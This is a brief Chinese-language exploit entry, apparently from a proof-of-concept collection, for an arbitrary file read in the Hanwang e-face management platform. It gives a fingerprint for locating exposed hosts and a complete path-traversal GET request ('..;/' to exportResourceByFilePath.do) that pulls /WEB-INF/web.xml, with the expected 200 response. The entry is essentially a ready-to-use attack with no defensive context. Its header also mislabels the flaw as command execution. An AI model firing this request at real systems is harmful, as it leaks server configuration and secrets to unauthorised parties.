# 汉王e脸通综合管理平台exportResourceByFilePath.do存在任意⽂件读取漏洞

汉王e脸通综合管理平台 ｜ 命令执行 ｜ —
- **指纹**：`body="async src=\"`
- **请求**：`GET /manage/intercom/..;/..;/manage/leaveList/exportResourceByFilePath.do?filePath=/WEB-INF/web.xml`
- **响应特征**：200